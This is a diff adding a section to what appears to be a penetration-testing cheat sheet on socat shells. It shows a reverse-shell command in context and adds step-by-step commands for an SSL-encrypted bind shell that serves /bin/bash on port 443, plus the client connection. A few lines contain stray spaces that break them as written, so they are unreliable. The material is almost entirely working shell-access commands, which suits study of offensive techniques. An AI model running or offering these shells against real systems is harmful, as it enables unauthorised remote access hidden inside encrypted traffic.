@@ -40,5 +40,24 @@ $ socat TCP4:remote_machine_ip:4444 EXEC:/bin/bash
 
 -------------------------------------------------------------------
 
+** SSL Socat bind shell
+
+Listener machine
+
+- Create self-signed cert and key
+$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36 2 -out bind_shell.crt
+
+- Combine key and cert into a single .pem file:
+$ cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+- Listen for connections
+$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin /bash
+
+Client machine
+$ socat - OPENSSL:remote_ip:443,verify=0
+
+-------------------------------------------------------------------
+
+
 
 
